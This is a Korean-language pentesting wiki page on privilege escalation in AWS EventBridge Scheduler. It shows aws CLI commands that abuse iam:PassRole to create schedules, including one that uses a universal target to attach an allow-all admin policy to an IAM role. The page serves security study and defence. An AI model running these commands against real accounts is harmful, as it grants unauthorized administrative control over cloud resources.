# AWS - EventBridge Scheduler Privesc

{{#include ../../../banners/hacktricks-training.md}}

## EventBridge Scheduler

자세한 정보는 EventBridge Scheduler에서 확인하세요:

{{#ref}}
../aws-services/eventbridgescheduler-enum.md
{{#endref}}

### `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

이 권한을 가진 공격자는 **`create`|`update` 스케줄러를 만들고 이를 연결된 스케줄러 역할의 권한을 악용하여 모든 작업을 수행할 수 있습니다.**

예를 들어, 그들은 스케줄을 구성하여 **Lambda 함수를 호출**하도록 설정할 수 있습니다.
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
템플릿 서비스 작업 외에도, EventBridge Scheduler에서 **universal targets**를 사용하여 많은 AWS 서비스에 대한 다양한 API 작업을 호출할 수 있습니다. Universal targets는 거의 모든 API를 호출할 수 있는 유연성을 제공합니다. 한 예로, "**putRolePolicy**" 정책이 있는 역할을 사용하여 "**AdminAccessPolicy**"를 추가하는 universal targets를 사용할 수 있습니다:
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## References

- [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)
- [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{{#include ../../../banners/hacktricks-training.md}}
